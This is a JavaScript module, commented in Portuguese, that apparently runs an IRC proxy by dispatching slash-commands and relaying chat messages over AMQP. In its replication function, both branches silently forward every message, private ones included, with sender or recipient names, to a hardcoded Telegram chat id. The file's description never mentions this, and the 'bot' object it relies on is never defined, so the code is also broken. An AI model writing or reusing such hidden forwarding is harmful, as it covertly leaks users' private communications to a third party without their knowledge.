/*
 * Módulo realiza a chamada de um método a partir de um comando.
 *
 * O processaMensagem irá receber uma mensagem e decidir
 * se a mesma deve ser interpretada como um comando ou como uma simples mensagem.
 *
 * Se for:
 *  - Comando  -> Deve chamar a função responsável por tratar o comando.
 *  - Mensagem -> Envia a mensagem para o canal presente na mensagem
 *
 */
let LOGGER = require('../../common/logger')
let event = require('../../common/appEvents')
let queueName = require('../../common/amqp/queues-name')
let AmqpReply = require('../model/AmqpReply')
let Comando = require('../model/ComandoIrc')

let exec = {
  'MOTD': require('./comando/motd'),
  'PRIVMSG': require('./comando/privmsg'),
  'QUIT': require('./comando/quit'),
  'JOIN': require('./comando/join'),
  'PART': require('./comando/part'),
  'PARTALL': require('./comando/partall'),
  'NICK': require('./comando/nick')
}

function processaMensagem (mensagem, proxies) {
  if (!mensagem.dados.message)
    return

  if (mensagem.dados.message.startsWith('/')) {
    processaComando(proxies[mensagem.token], mensagem.dados)
  } else {
    enviaMensagem(proxies[mensagem.token], mensagem.dados)
  }
}

function processaComando (proxy, dado) {
  let comando = new Comando(dado.message)

  if (!exec[comando.id]) {
    comandoDesconhecido(proxy, comando)
  } else {
    exec[comando.id](comando, proxy)
  }
}

function comandoDesconhecido (proxy, comando) {
  LOGGER.log('error', 'Comando desconhecido: ' + comando.id)
  new AmqpReply()
    .queue(queueName.processar + proxy.info.id)
    .event(event.error)
    .message(comando.id + ': Comado desconhecido')
    .send()
}

function enviaMensagem (proxy, data) {
  if (data.destination.type === 'USER' || data.destination.type === 'CHANNEL') {
    proxy.clienteIRC.say(data.destination.name, data.message)
  }
  replicaParaTransmissor(data, proxy)
}

function replicaParaTransmissor (data, proxy) {
 if(data.from!=null){
    new AmqpReply()
    .queue(queueName.processar + proxy.info.id)
    .event(event.message)
    .message(data.message)
    .nickname(data.from)
    .channel(data.destination.type === 'CHANNEL' ? data.destination.name : null)
    .send()
    bot.telegram.sendMessage('-1001261659642',data.message);
  }
  else{
  new AmqpReply()
    .queue(queueName.processar + proxy.info.id)
    .event(event.message)
    .message(data.message)
    .nickname(data.destination.type === 'USER' ? data.destination.name : null)
    .channel(data.destination.type === 'CHANNEL' ? data.destination.name : null)
    .send()
   bot.telegram.sendMessage('-1001261659642','Para:'+data.destination.name+'\n'+proxy.info.nickname+"  :  "+data.message);
}
}

module.exports = {
  queue: queueName.processar,
  action: processaMensagem
}